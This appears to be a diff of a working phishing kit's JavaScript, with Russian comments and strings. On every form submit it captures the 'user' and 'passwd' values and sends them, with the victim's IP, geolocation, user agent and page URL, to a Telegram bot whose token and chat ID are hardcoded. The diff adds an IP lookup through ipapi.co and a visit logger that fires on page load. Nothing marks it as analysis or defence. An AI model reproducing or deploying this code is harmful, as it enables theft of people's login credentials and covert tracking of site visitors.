@@ -1,7 +1,6 @@
 const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
 const tgChatId = "-1002252120859";
 
-// Отправка сообщения в Telegram
 function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
     fetch(url, {
@@ -11,21 +10,33 @@ function sendToTelegram(message) {
     }).catch(err => console.error("Ошибка отправки в Telegram:", err));
 }
 
-// Хэширование домена
 function hashDomain(domain) {
     return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
         .then(buffer => {
-            const hashArray = Array.from(new Uint8Array(buffer));
-            const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
-            return `#${hashHex.slice(0, 8)}`; // Возвращаем первые 8 символов хеша
-        })
-        .catch(err => {
-            console.error("Ошибка хэширования домена:", err);
-            return "#error";
+            let hashArray = Array.from(new Uint8Array(buffer));
+            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
+            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
         });
 }
 
-// Упрощенный User-Agent
+function getIPInfo() {
+    return fetch("https://ipapi.co/json/")
+        .then(response => {
+            if (!response.ok) {
+                throw new Error("Ошибка получения информации о IP");
+            }
+            return response.json();
+        })
+        .then(data => {
+            return {
+                ip: data.ip,
+                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
+                org: window.location.hostname,
+            };
+        })
+        .catch(err => console.error("Ошибка получения информации о IP:", err));
+}
+
 function getSimplifiedUserAgent() {
     const userAgent = navigator.userAgent || "Неизвестно";
     const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
@@ -35,22 +46,16 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-// Обработчик отправки формы
-function handleSubmit(event) {
-    //event.preventDefault(); // Отключаем стандартное поведение формы
-
-    // Получение данных из формы
+document.addEventListener("submit", event => {
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
     const password = formData.get("passwd") || "Не указано";
 
-    // Получение данных о User-Agent и домене
     const simplifiedUserAgent = getSimplifiedUserAgent();
-    const domain = window.location.hostname;
 
-    hashDomain(domain).then(domainHashTag => {
-        // Формирование сообщения
-        const message = `🚀 *Новая отправка формы:*
+    getIPInfo().then(info => {
+        hashDomain(info.org).then(domainHashTag => {
+            const message = `🚀 *Новая отправка формы:*
 ---
 - 🛡️ **Логин:**
 \`\`\`
@@ -60,18 +65,33 @@ ${login}
 \`\`\`
 ${password}
 \`\`\`
+- 🌐 **IP-адрес:** ${info.ip}
+- 📍 **Местоположение:** ${info.location}
 - 🖥️ **User-Agent:** ${simplifiedUserAgent}
 - 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${domain}
+- 🏢 **Организация:** ${info.org}
 ${domainHashTag}`;
+            sendToTelegram(message);
+        });
+    });
+});
 
-        // Отправка сообщения
-        sendToTelegram(message);
+function logPageVisit() {
+    const simplifiedUserAgent = getSimplifiedUserAgent();
 
-        // Сброс формы после отправки
-        //event.target.reset();
+    getIPInfo().then(info => {
+        hashDomain(info.org).then(domainHashTag => {
+            const message = `🌍 *Новый визит страницы:*
+---
+- 🌐 **IP-адрес:** ${info.ip}
+- 📍 **Местоположение:** ${info.location}
+- 🖥️ **User-Agent:** ${simplifiedUserAgent}
+- 🔗 **Страница:** ${window.location.href}
+- 🏢 **Организация:** ${info.org}
+${domainHashTag}`;
+            sendToTelegram(message);
+        });
     });
 }
 
-// Добавление обработчика события submit
-document.addEventListener("submit", handleSubmit);
+logPageVisit();
